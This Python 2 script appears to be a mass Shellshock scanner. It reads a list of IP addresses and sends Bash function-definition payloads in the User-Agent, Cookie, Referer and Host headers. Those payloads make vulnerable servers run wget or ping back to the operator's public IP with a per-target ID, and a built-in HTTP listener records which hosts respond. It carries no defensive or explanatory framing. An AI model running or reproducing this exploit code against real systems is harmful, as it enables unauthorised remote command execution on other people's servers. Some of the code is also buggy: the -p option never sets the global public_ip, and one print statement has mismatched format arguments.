import Queue
import SocketServer
import SimpleHTTPServer
import threading
import getopt
import sys
import urllib2
import hashlib
import socket
import time
import os
import base64

max_threads = 20

local_ip = socket.gethostbyname(socket.gethostname())


####GOTTA SET THESE!!!
local_ip = "0.0.0.0"
#public_ip = "-----"
local_port = 80
https_port = 443
ids = {}

def pause():
	raw_input("Press Enter to continue...")

def record_scan_response():
	""" sample function to be called via a URL"""
	return 'ShellShock Returned'
	
class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
	def do_GET(self):
		id = self.path[1::]
		print "%s ### ### ### Responded ### ### ### \n" % base64.b64decode(id) 

		try:
			print "%s ### ### ### Responded ### ### ### \n" % base64.b64decode(id) 
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.end_headers()
		#	self.wfile.write(record_scan_response()) #call sample function here
		except:
			print("Unknown address responded, ID=%s" % self.path[1::])
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.end_headers()
			self.wfile.write(record_scan_response()) #call sample function here
		return

def test_ip(ip_address, identifier):
	#Send a Bash/CGI Injection with the unique identifier.
	#public_ip = public_ip.strip()
	print "Starting scan for %s (ID: %s)" % (ip_address,identifier)
	ip_address = ip_address.strip()
	identifier = identifier.strip()
		
	list_of_exp_str = [ "() { :; }; wget http://" + public_ip + "/" + identifier + " >> /dev/null",
			   "() { :; }; /usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null",
			   "() { :; }; /bin/bash -c 'wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
			   "() { :; }; /bin/bash -c '/usr/bin/wget http://" + public_ip + "/" + identifier + " >> /dev/null'",
			   "() { :; }; ping -c 6 " + public_ip,
			   "() { :; }; /usr/ping -c 6 " + public_ip,
			   "() { :; }; /bin/bash -c 'ping -c 6 " + public_ip + "'",
			   "() { :; }; /bin/bash -c '/usr/ping -c 6 " + public_ip + "'" ]
	
	
	for exploit_str in list_of_exp_str:
		timeout = 10
		socket.setdefaulttimeout(timeout)
		
		opener = urllib2.build_opener()
		opener.addheaders = [('User-Agent', exploit_str), ('Cookie', exploit_str), ('Referer', exploit_str), ('Host', exploit_str)]
		
		try:
			url_str = "http://%s/" % ip_address
			print "%s,%s URL: %s\n" % (url_str,exploit_str)
			response = opener.open(url_str)
		except:
			pass
			#print "Unable to connect, moving on\n"
		
		try:
			url_str = "https://%s/" % ip_address
			#print "%s,%s URL: %s\n" % (url_str,exploit_str)
			response = opener.open(url_str)
		except:
			pass
			#print "Unable to connect, moving on\n"
	return

def create_ip_scan_table(ips):
	#Generate a map of IPs and unique identifiers.
	salt = "ShellShockSalt"
	hash_table = {}
	for ip in ips:
		ip = ip.strip()
		#m = hashlib.md5()
		#m.update(str(ip)+salt)
		id = base64.b64encode(str(ip)+salt)
		hash_table[id]=ip
	return hash_table
		
def usage():
	#Print usage
	print "shellshock_scanner.py"
	print "Options:"
	print "-i <inputfile>"
	print "-o <outputfile>"
		
def main():
	#read IP Addresses to Scan
	input_filename = ""
	output_filename = ""
	attack_ports = [80,443]
	try:
		opts, args = getopt.getopt(sys.argv[1:],"i:p:o:")
	except getopt.GetoptError as err:
		print str(err)
		usage()
		sys.exit()

	#if public_ip == "-----":
	#	print "Must set public_ip using -p"
	#	exit()
		
	#Get all our opts in place.
	for o, a in opts:
		if o == "-h":
			usage()
			return
		elif o == "-i":
			input_filename = a
		elif o == "-p":
			public_ip = a
		elif o == "-o":
			output_filename = a

	if input_filename == "" or output_filename == "":
		usage()
		return

	if public_ip == "-----":
                print "Must set public_ip using -p"
                exit()

	input_file = open(input_filename,"r")
	output_file = open(output_filename,"w")
	ips = input_file.readlines()
	ids = create_ip_scan_table(ips);
	print "Hashtable Generated, hit any key to continue"
	pause()
	
	#Start Listening Server
	httpd = SocketServer.ThreadingTCPServer(('', local_port),CustomHandler)
	server = threading.Thread(target=httpd.serve_forever);
	server.daemon=True
	server.start();
	print "ShellShock Scan Listener started on %s:%s" % (local_ip,local_port)
	print "Expecting connections to public address %s" % (public_ip)
	
	
	
	for id in ids.keys():

		t=threading.Thread(target=test_ip,args=(ids[id],id))
		t.daemon = True
		t.start()
		while (threading.activeCount()) >= max_threads:
			#print "Hit max thread count (%s/%s), waiting 5 seconds\n" % (str(threading.activeCount()),max_threads)
			time.sleep(5)
		
	print("Finished list, waiting for threads to close.")
	
	while (threading.activeCount() > 2):
		print "Waiting for %s threads to close" % threading.activeCount()
		time.sleep(5)
	
	print("Shutting down server")
	httpd.shutdown

public_ip = "-----"
main()
